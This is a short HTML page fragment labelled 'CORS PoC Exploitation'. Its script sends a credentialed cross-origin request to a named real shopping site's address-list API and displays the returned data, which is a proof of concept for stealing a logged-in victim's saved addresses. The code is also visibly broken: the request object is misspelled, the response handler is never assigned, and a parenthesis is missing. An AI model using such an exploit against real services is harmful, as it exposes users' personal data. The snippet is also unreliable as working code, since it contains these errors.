   <script>
    function cors () {
      var xhttp = new XMLHttpRequeat();
       if (this.readyState == 4 && this.status == 200) {
           document.getElementById("emo").innerHTML = alert(this.responseText);
           
       }
     };
     xhttp.open("GET", "https://www.lazada.co.id/address/api/listAddress", true;
     xhttp.withCredentials = true;
     xhttp.send();
     }
     </script>
     </head>
     <body>
       <center>
       <h1> CORS PoC Exploitation </h1>
